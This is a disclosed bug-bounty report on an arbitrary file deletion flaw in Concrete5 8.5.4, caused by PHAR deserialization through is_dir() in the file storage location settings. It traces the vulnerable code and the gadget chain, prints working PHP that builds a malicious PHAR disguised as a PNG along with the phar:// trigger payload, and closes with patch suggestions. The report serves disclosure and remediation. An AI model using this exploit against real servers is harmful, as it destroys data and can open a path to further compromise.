# Arbitrary File delete via PHAR deserialization

## Report Details
- **Report ID**: 921288
- **URL**: https://hackerone.com/reports/921288
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-07-11T22:02:19.808Z
- **Disclosed**: 2021-10-20T16:24:54.512Z

## Reporter
- **Username**: reset
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: concretecms

## Vulnerability Information
crayons :)

### Concrete5 Arbitrary File delete via PHAR deserialization

- Target: Concrete5
- Version: 8.5.4 (Latest at 2020. 07. 12) / PHP 7.2
- Credit: [WSP Lab](https://wsp-lab.github.io/)@KAIST
- Contact: reset@kaist.ac.kr



#### TL; DR

- An attacker can send an arbitrary input value in the is_dir() function, which causes a PHAR deserialization bug. By using this bug, `the attacker possible to exploit that deletes arbitrary files.`



### Background

- PHP Object Injection (PHP deserialization): When an attacker controls a serialized object that is passed into unserialize(), she can control the properties of the created object. This will then allow her the opportunity to hijack the flow of the application, by controlling the values passed into magic methods like __wakeup() [1].
- PHAR deserialization: The attack surface of the PHP deserialization vulnerability has been extended. With the parameter of filesystem function (`file_exists()`, `is_dir()`, etc.) under control, this method can be used with `phar://` pseudo-protocol to directly perform deserialization without relying on `unserialize()`[2].



### Bug analyzing

#### Endpoint

- Navigation: Dashboard => System&Settings => File Storage Location => Add Location

{F903876}



#### Bug flow

- When attackers add optional file storage locations at the endpoint, the server executes `validateStorageRequest()` method to validate the location path code, which is (a).

```php
- File: concrete/controllers/single_page/dashboard/system/files/storage.php
- Line: 131 ~ 148
    
    public function add()
    {
        $type = $this->validateStorageRequest(); // ................................................... (a)
        if (!$this->token->validate('add')) {
            $this->error->add($this->token->getErrorMessage());
        }
        if (!$this->error->has()) {
            $configuration = $type->getConfigurationObject();
            $configuration->loadFromRequest($this->request);
            $factory = $this->app->make(StorageLocationFactory::class);
            /* @var StorageLocationFactory $factory */
            $location = $factory->create($configuration, $this->request->request->get('fslName'));
            $location->setIsDefault($this->request->request->get('fslIsDefault'));
            $location = $factory->persist($location);
            $this->redirect('/dashboard/system/files/storage', 'storage_location_added');
        }
        $this->set('type', $type);
    }
```

- Next, the request that the attacker sent will be transported to validateRequest() as a parameter - (b).

```php
- File: concrete/controllers/single_page/dashboard/system/files/storage.php
- Line: 64 ~ 81
    
    protected function validateStorageRequest()
    {
        $val = $this->app->make('helper/validation/strings');
        $type = Type::getByID($this->request->get('fslTypeID'));
        if ($type === null) {
            $this->error->add(t('Invalid type object.'));
        } else {
            $e = $type->getConfigurationObject()->validateRequest($this->request); // ................... (b)
            if (is_object($e)) {
                $this->error->add($e);
            }
        }
        if (!$val->notempty($this->request->request->get('fslName'))) {
            $this->error->add(t('Your file storage location must have a name.'));
        }
 
        return $type;
    }
```

- Finally, `is_dir` function will be executed by user input without any sanitization.

```php
- File: concrete/src/File/StorageLocation/Configuration/LocalConfiguration.php
- Line: 75 ~ 102
    
    public function validateRequest(\Concrete\Core\Http\Request $req)
    {
        $app = Application::getFacadeApplication();
        $e = $app->make('error');
        $data = $req->get('fslType');
        $fslID = $req->get('fslID');
        $locationHasFiles = false;
        $locationRootPath = null;
        if (!empty($fslID)) {
            $location = $app->make(StorageLocationFactory::class)->fetchByID($fslID);
            if (is_object($location)) {
                $locationHasFiles = $location->hasFiles();
                $locationRootPath = $location->getConfigurationObject()->getRootPath();
            }
        }
        $this->path = $data['path'];
        if (!$this->path) {
            $e->add(t("You must include a root path for this storage location."));
        } elseif (!is_dir($this->path)) { // ......................................................... (c)
            $e->add(t("The specified root path does not exist."));
        } elseif ($this->path == '/') {
            $e->add(t('Invalid path to file storage location. You may not choose the root directory.'));
        } elseif ($locationHasFiles && $locationRootPath !== $this->path) {
            $e->add(t('You can not change the root path of this storage location because it contains files.'));
        }

        return $e;
    }

```

- In other words, an attacker can send an arbitrary path, which is executed with the parameter of is_dir(). Even if the path has "phar://" schema.



### Exploit 

- To exploit this bug, I will use POP (Property Oriented Programming) technique [3].

- To chain gadgets, I found 3 nice gadgets to delete some files.

  

#### Gadgets

- Gadget #1. VolatileDirectory::__destruct()
  - It will naturally execute below codes when PHP terminated. Because, __destruct is magic method that invoked when class destructed.

```php
// File: concrete/src/File/Service/VolatileDirectory.php
// Class: VolatileDirectory
// Line: 75 ~ 84
    
    public function __destruct()
    {
        if ($this->path !== null) {
            try {
                $this->filesystem->deleteDirectory($this->path); // ....................... (d)
            } catch (Exception $foo) {
            }
            $this->path = null;
        }
    }
```

- Gadget #2. Filesystem::deleteDirectory()

```php
// File: concrete/vendor/illuminate/filesystem/Filesystem.php
// Class: Filesystem
// Line: 473 ~ 502

     public function deleteDirectory($directory, $preserve = false)
     {
         if (! $this->isDirectory($directory)) {
             return false;
         }
 
         $items = new FilesystemIterator($directory);
 
         foreach ($items as $item) {
             // If the item is a directory, we can just recurse into the function and
             // delete that sub-directory otherwise we'll just delete the file and
             // keep iterating through each file until the directory is cleaned.
             if ($item->isDir() && ! $item->isLink()) {
                 $this->deleteDirectory($item->getPathname());
             }
 
             // If the item is just a file, we can go ahead and delete it since we're
             // just looping through and waxing all of the files in this directory
             // and calling directories recursively, so we delete the real path.
             else {
                 $this->delete($item->getPathname()); // ............................ (e)
             }
         }
 
         if (! $preserve) {
             @rmdir($directory);
         }
 
         return true;
     }
```

- Gadget #3. Filesystem::delete()

```php
// File: concrete/vendor/illuminate/filesystem/Filesystem.php
// Class: Filesystem
// Line: 148 ~ 165

     public function delete($paths)
     {
         $paths = is_array($paths) ? $paths : func_get_args();
 
         $success = true;
 
         foreach ($paths as $path) {
             try {
                 if (! @unlink($path)) { // ........................................ (f)
                     $success = false;
                 }
             } catch (ErrorException $e) {
                 $success = false;
             }
         }
 
         return $success;
     }
```



#### Exploit code

#### Stage #1. Make PHAR file to exploit.

```php
// Input: None
// Output: concrete5_exploit.png

<?php
// Gadgets
namespace Illuminate\Filesystem{
  class Filesystem{}
}
namespace Concrete\Core\File\Service{ 
  class VolatileDirectory{
    protected $filesystem;
    protected $path;
    function __construct(){
      $this->filesystem = new \Illuminate\Filesystem\Filesystem;
      $this->path = "/var/www/html/phar_exploit/test_dir";
      // Directory that including some files. (Attacker can set any path.)
    }
  }
}

// Generate phar file to exploit
namespace{
  $output_path = __DIR__;
  $exploit_file = $output_path . "/concrete5_exploit.phar";
  $phar = new Phar($exploit_file);
  $phar->startBuffering();
  $phar->setStub("<?php __HALT_COMPILER();");
  
  $payload = new \Concrete\Core\File\Service\VolatileDirectory;
  $phar->setMetadata($payload);
  
  $phar->addFromString("dummy.txt", "DUMMY");
  $phar->stopBuffering();

  // Change file extension PHAR to PNG. (for bypassing file upload restrictions)
  $changing_file_name = "concrete5_exploit.png";
  $changing_internal_full_path = $output_path . "/" . $changing_file_name;
  rename($exploit_file, $changing_file_name);
}


// Run below command to make PHAR file.
// php generate_exploit.php
```

#### Stage #2. Upload PHAR file.

- Fortunately, concrete5 supports file upload featue.
  - Navigation: Dashboard => Files => File Manager => Upload Files

{F903877}

{F903878}

#### Stage #3. Triggering PHAR deserialization bug.

- Navigation: Dashboard => System&Settings => File Storage Location => Add Location
- Payload: `phar://./application/files/6815/9449/9442/concrete5_exploit.png`

{F903879}



#### Exploit Before / After

- Before (Directory: /var/www/html/phar_exploit/test_dir)

{F903880}

- After (Directory)

{F903881}

- test1/2/3.txt were deleted by exploit.



### Patch

- To avoid PHAR deserialization bug,  you should not fully trust the user's input. You can sanitize a user's input in various ways.

  1. Occurring an error when the user enters "phar://".

     ```php
     <?php
     // input_path is phar://path/to/file
     if(strpos($input_path, "phar://") !== FALSE){
         trigger_error("Detected phar wrapper!", E_USER_ERROR); // phar detected.
     }
     else{
         is_dir($input_path);
     }
     ?>
     ```

  2. Forcing path setting as a prefix.

     ```php
     <?php
     // input_path is phar://path/to/file
     $sanitized_path = "/" . $input_path;
     // sanitized_path is /phar://path/to/file
     // Therefore, PHP wouldn't recognize that file is phar wrapped file.
     is_dir($sanitized_path);
     ?>
     ```



### Reference

[1] https://blog.usejournal.com/diving-into-unserialize-phar-deserialization-98b1254380e9

[2] https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066

[3] Stefan Esser, Utilizing Code Reuse/Return Oriented Programming in PHP Web Application Exploits, Blackhat  USA 2010

## Impact

- Attacker could delete any files on the server.
- This report is just one example of using this bug.
- In other words, if an attacker using other gadgets to exploit (POP technique) this bug, It will potentially generate various exploits including XSS and SQL injection, remote code execution, and so on.

## Attachments
- image-20200712042659225.png
- image-20200712054249847.png
- image-20200712062149547.png
- image-20200712055052386.png
- image-20200712055237892.png
- image-20200712055306938.png
